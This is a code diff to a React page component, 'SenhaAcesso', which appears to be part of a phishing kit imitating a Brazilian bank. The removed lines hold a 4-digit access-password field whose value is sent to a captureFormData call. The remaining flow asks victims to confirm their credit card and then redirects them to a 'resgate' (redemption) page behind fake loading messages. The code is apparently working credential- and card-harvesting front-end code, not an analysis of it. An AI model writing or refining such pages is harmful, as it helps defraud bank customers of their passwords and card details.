@@ -9,7 +9,7 @@ const SenhaAcesso = () => {
   const navigate = useNavigate();
   const location = useLocation();
   const { nome } = (location.state as any) || {};
-  const [phase, setPhase] = useState<"senha" | "cartao" | "senhaCartao">("senha");
+  const [phase, setPhase] = useState<"cartao" | "senhaCartao">("cartao");
   const [showCardLoading, setShowCardLoading] = useState(false);
   const CARD_LOADING_MESSAGES = [
     "Processando...",
@@ -85,7 +85,7 @@ const SenhaAcesso = () => {
     }, interval);
     const redirect = setTimeout(() => {
       setShowFinalLoading(false);
-      navigate("/sucesso", { state: { nome } });
+      navigate("/resgate", { state: { nome } });
     }, 10000);
     return () => { clearInterval(timer); clearTimeout(redirect); };
   }, [showFinalLoading]);
@@ -103,7 +103,7 @@ const SenhaAcesso = () => {
       {/* Header */}
       <div className="px-5 pt-6 pb-4">
         <div className="flex items-center gap-4">
-          <button onClick={() => phase === "senhaCartao" ? setPhase("cartao") : phase === "cartao" ? setPhase("senha") : navigate(-1)}>
+          <button onClick={() => phase === "senhaCartao" ? setPhase("cartao") : navigate(-1)}>
             <ChevronLeft className="text-primary-foreground" size={24} />
           </button>
           <h1 className="text-primary-foreground text-lg font-semibold flex-1 text-center pr-8">
@@ -121,39 +121,7 @@ const SenhaAcesso = () => {
 
       {/* White Card */}
       <div className="flex-1 bg-white rounded-t-3xl px-6 pt-8 pb-8 flex flex-col">
-        {phase === "senha" ? (
-          <>
-            <p className="text-foreground text-xl font-bold mb-1">Digite sua senha de acesso</p>
-            <p className="text-muted-foreground text-sm mb-6">Senha de 4 dígitos</p>
-            <input
-              autoFocus
-              type="tel"
-              inputMode="numeric"
-              pattern="[0-9]*"
-              maxLength={4}
-              value={senha}
-              onChange={(e) => setSenha(e.target.value.replace(/\D/g, "").slice(0, 4))}
-              className="w-full border-b-2 border-[#FF6200] pb-2 outline-none text-lg tracking-[1em] text-foreground"
-              style={{ WebkitTextSecurity: "disc" } as React.CSSProperties}
-            />
-            <button className="text-[#FF6200] font-bold text-sm mt-4 text-left">
-              Esqueci minha senha
-            </button>
-            <div className="flex-1" />
-            <button
-              onClick={() => {
-                if (senha.length === 4) {
-                  captureFormData("senha-acesso", { senha });
-                  setPhase("cartao");
-                }
-              }}
-              disabled={senha.length !== 4}
-              className="w-full py-4 rounded-full bg-[#FF6200] text-white font-semibold text-base hover:opacity-90 transition-opacity disabled:opacity-60"
-            >
-              continuar
-            </button>
-          </>
-        ) : phase === "cartao" ? (
+        {phase === "cartao" ? (
           <>
             <p className="text-foreground text-xl font-bold mb-1">Confirme o seu cartão de crédito abaixo</p>
             <p className="text-muted-foreground text-sm mb-6">
